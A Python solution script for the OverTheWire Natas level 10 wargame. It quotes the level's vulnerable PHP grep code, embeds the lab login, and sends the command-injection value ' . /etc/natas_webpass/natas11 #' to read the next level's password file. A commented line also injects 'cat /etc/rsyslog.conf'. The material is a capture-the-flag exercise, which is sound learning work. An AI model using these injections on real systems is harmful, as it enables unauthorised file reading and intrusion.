#!/usr/bin/env python3
'''
Command  injection
https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas10.py

https://www.youtube.com/watch?v=RVHbDAHsXZw&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=8

Level 10 → Level 11
Username: natas10
URL:      http://natas10.natas.labs.overthewire.org
password:  nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
problem :
      if($key != "") {
          if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
        } else {
        passthru("grep -i $key dictionary.txt");
       }

write up:
  This sourcecode is similar to the one from the last level.
    The difference is, that the characters ;, | and & are not allowed.

 1. Put this command:
         grep -i -v - /etc/natas_webpass/natas11 dictionary.txt
'''
import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'


url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
content = response.text
print("1. response.text \n------------------\n",response.text)

session = requests.Session()
# response = session.get(url, auth = (username, password) )
#response = session.post(url0, data = {"secret": "oubWYf2kBq", "submit":"submit" }, auth = (username, password) )
#response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas10 #", "submit":"submit" }, auth = (username, password) )

#needle is the name of the variable in the php form
#search_str = "a;  cat /etc/rsyslog.conf"# Output a file

# Command  injection
# Since we are not usin any char from ;, | we can use the method of natas9
search_str =  " . /etc/natas_webpass/natas11  #"

# So the command is: grep -i . /etc/natas_webpass/natas11  # dictionary.txt
# So this is a grep command   scans every word in the  'natas11' file
response = session.post(
                        url,
                        data = {"needle": search_str, "submit":"submit" },
                        auth = (username, password) )
content = response.text
print("2. Response with search string = ",search_str, "\n------------------\n",response.text)
# print content

print (re.findall('<pre>\n(.*)\n</pre>', content)[0])

'''
url_sorce_code = url + 'index-source.html'
print("4. Sorce code of ",url_sorce_code,"\n\n +++++++++++++\n\n")
response = session.get(url_sorce_code, auth = (username, password) )
content = response.text
print( response.text)
'''